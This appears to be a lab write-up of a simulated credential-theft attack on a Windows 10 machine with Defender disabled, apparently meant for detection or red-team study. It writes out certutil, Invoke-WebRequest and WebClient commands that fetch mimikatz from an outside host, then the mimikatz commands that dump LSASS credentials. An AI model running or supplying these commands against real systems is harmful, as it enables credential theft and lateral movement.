# Scenario
An attacker has gained access into a windows 10 pro machine and performed privilege escalation techniques, giving them access to the local admin account of the victim machine. With their elevated privileges they have been able to download Mimikatz onto the victim
machine and have used this to perform a credential dump for any of the users on the computer. These will presumably be used to attempt lateral movement onto other victim machines using techniques such as Pass-the hash.

# Setup
- Defender Diabled
# Attack steps

## Attacker downloads mimkatz from an external source
Available Tools:
- Certutil
- Invoke-WebRequest
- System.Net.WebClient

1. Certutil
   - Attacker opens powershell or CMD
   - Runs Command: `certutil -urlcache -f http://192.168.1.105:8080/mimikatz.exe mimkatz.exe`

   Screenshot: <img width="840" height="532" alt="image" src="https://github.com/user-attachments/assets/54c1e32a-b534-4520-aa72-6fe9733c028f" />

2. Invoke-WebRequest
   - Attacker opens powershell
   - Runs Command: `Invoke-WebRequest -Uri "http://192.168.1.105:8080/mimikatz.exe" -OutFile "mimikatz.exe"`
   Screenshot: <img width="1026" height="766" alt="image" src="https://github.com/user-attachments/assets/9793dcb9-b6da-477c-853d-0f271e39326c" />

3. System.Net.WebClient
   - Attacker opens powershell
   - Runs Commands: `$wc = New-Object System.Net.WebClient` and `$wc.DownloadFile("http://192.168.1.105:8080/mimikatz.exe", "mim1katz.exe.exe")`

## Attacker starts the executable 

## Attacker begins dumping the Credentials 
  - Attacker requests SEDeubgPrivilege for the current process giving the process access to protected process such as LSASS.exe `privilege::debug`
  - Attacker dumps the credentials `sekurlsa:logonpasswords`
    Screenshot: <img width="1030" height="766" alt="image" src="https://github.com/user-attachments/assets/e00760f1-23e8-4301-87b6-905a8f5cedf8" />

# Next Steps
- Attacker may crack weak credentials and obtain the password
- Attacker may use these in pass-the-hash attacks



